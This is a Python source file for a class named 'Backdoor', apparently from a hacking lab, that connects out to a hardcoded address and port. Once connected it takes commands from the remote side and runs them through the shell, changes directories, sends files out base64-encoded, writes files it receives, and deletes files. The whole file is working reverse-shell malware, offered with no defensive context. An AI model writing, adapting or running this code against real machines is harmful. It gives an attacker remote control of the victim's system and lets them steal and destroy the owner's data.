import socket
import json
import sys
import subprocess
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            return "[-] Error in execute command.".encode()

    def delete_system_command(self, command: list):
        try:
            command_str = f'{command[0]} {command[1]}'
            subprocess.check_output(command_str, shell=True)
            return f"[+] File {command[1]} delete successful.".encode()
        except subprocess.CalledProcessError:
            return "[-] Error in execute command.".encode()

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_directory(self, path):
        os.chdir(path)
        return f"[!] Changing working directory to {path}".encode()

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful!".encode()

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()

                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == 'download':
                    command_result = self.read_file(command[1])
                elif command[0] == 'upload':
                    command_result = self.write_file(command[1], command[2])
                elif command[0] == 'rm':
                    command_result = self.delete_system_command(command)
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error in syntax command.".encode()

            self.reliable_send(command_result.decode())


my_server = Backdoor("10.211.55.2", 8080)
my_server.run()
